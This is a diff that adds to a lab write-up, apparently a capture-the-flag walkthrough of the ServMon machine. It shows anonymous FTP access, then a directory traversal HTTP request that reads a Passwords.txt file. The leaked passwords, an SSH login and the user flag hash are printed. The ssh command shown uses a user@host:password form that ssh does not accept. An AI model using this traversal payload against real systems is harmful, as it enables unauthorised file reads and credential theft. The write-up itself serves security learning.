@@ -39,3 +39,70 @@ PORT     STATE SERVICE       VERSION
 | Not valid before: 2020-01-14T13:24:20
 |_Not valid after:  2021-01-13T13:24:20
 |_ssl-date: TLS randomness does not represent time
+
+Playing with the ftp server:
+└─# ftp 10.10.10.184
+Connected to 10.10.10.184.
+220 Microsoft FTP Service
+Name (10.10.10.184:joe): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+01-18-20  12:05PM       <DIR>          Users
+226 Transfer complete.
+
+└─# cat Confidential.txt 
+Nathan,
+I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
+Regards
+Nadine
+
+Viewing the notes:
+└─# cat 'Notes to do.txt' 
+1) Change the password for NVMS - Complete
+2) Lock down the NSClient Access - Complete
+3) Upload the passwords
+4) Remove public access to NVMS
+5) Place the secret files in SharePoint
+
+I am now going for this Passwords.txt file.
+Now I visit the website at : http://10.10.10.184/Pages/login.htm
+
+GET /../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
+Host: 10.10.10.184
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: dataPort=6063
+Upgrade-Insecure-Requests: 1
+
+And the passwords were returned:
+HTTP/1.1 200 OK
+Content-type: text/plain
+Content-Length: 156
+Connection: close
+AuthInfo: 
+
+1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
+
+And now time to ssh in:
+ssh nadine@10.10.10.184:L1k3B1gBut7s@W0rk
+nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
+9dc4113a38fc23a660fc568b0274f01b
+
+============================================
+Privelege Escalation
+============================================
+
